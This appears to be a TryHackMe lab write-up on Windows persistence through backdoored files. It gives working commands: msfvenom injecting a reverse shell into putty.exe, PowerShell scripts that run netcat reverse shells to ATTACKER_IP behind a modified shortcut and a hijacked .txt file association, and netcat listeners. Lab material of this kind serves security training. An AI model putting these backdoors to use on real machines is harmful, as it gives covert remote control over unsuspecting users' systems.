# Windows Local Persistence: Backdooring Files

Establishing persistence can involve tampering with files that users interact with regularly. By modifying these files, backdoors can be planted to execute whenever the user accesses them. To avoid detection, the altered files must continue to function as expected.

Below are some common methods for planting backdoors:

---

## Executable Files

Executable files found on the desktop are often used frequently by users. For example, if a shortcut to PuTTY is found, it might point to `C:\Program Files\PuTTY\putty.exe`. The executable can be downloaded, modified, and re-uploaded to include a payload.

### Example: Backdooring `putty.exe`
Use `msfvenom` to inject a payload into an executable:
```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```
The resulting `puttyX.exe` will execute a reverse shell payload while maintaining the original functionality of PuTTY.

---

## Shortcut Files

Instead of altering the executable, the shortcut file itself can be tampered with. The shortcut can be modified to point to a script that runs a backdoor and then executes the original program.

### Example: Backdooring a Shortcut
1. Create a PowerShell script (e.g., `C:\Windows\System32\backdoor.ps1`):
    ```powershell
    Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
    Start-Process -NoNewWindow "C:\Windows\System32\calc.exe"
    ```
2. Modify the shortcut's target to:
    ```plaintext
    powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
    ```
3. Adjust the shortcut's icon to match the original executable.

### Listener Setup
Start a listener on the attacker's machine:
```bash
nc -lvp 4445
```
When the shortcut is double-clicked, a reverse shell will be established, and the user will see the expected program (e.g., Calculator).

---

## Hijacking File Associations

File associations can be hijacked to execute a backdoor whenever a specific file type is opened. File associations are stored in the registry under `HKLM\Software\Classes\`.

### Example: Hijacking `.txt` Files
1. Locate the ProgID for `.txt` files (e.g., `txtfile`) and its `shell\open\command` subkey.
2. Create a PowerShell script (e.g., `C:\Windows\backdoor2.ps1`):
    ```powershell
    Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
    Start-Process -NoNewWindow "C:\Windows\system32\NOTEPAD.EXE" $args[0]
    ```
3. Modify the registry key to:
    ```plaintext
    powershell.exe -WindowStyle hidden C:\Windows\backdoor2.ps1 %1
    ```
4. Start a listener on the attacker's machine:
    ```bash
    nc -lvp 4448
    ```
5. Open any `.txt` file on the victim machine to trigger the backdoor.

---

## THM Flag

Execute `C:\flags\flag5.exe` from your reverse shell to retrieve the flag.